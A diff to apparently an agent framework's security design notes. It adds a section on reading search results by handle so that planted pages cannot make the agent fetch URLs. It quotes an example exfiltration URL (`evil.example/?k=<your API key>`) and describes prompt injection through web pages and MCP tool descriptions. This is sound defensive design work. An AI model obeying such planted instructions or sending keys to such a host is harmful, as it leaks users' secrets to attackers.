@@ -160,6 +160,24 @@ machine-layer boundary: `~/.ssh`, `~/.aws`, `~/.m2/settings.xml`,
 and other projects don't resolve for the parent — blast radius is
 the *project* surface, not the whole box.
 
+**Reading search results without visiting the pages.** Snippets
+rarely answer a question, so an agent that searches usually also
+gets `web_scrape` — and then a planted page can tell it to visit
+`evil.example/?k=<your API key>`. A host can instead build
+`web_search` with `page_text: true` (Brave or Exa) and add
+`web_read_cached`: the search brings back each result's text from
+the engine's own index, and the reader returns it by a handle like
+`a3f9c21e`, never by URL, making no request of its own. The agent's
+only way out is then the search query, to an engine pikuri picked,
+which an attacker can't read back. Handles are keyed per process, so
+a crafted URL can't take over a popular page's handle, and 8 hex
+digits are too many to guess another conversation's pages from. What
+it doesn't stop: a hostile page still lands in the agent's context
+word for word and can mislead it, a secret pushed into a query still
+reaches the engine (Exa trains on queries; Brave logs them up to 90 days),
+and wiring `web_scrape` or `fetch` beside it brings the attacker's
+way out back. See `D_page_text_by_handle`.
+
 **MCP description verification.** Even when the MCP *process* is
 benign, its tool descriptions can be injected (supply-chain
 compromise, MITM, a duped author) — and this lands at *registration*,
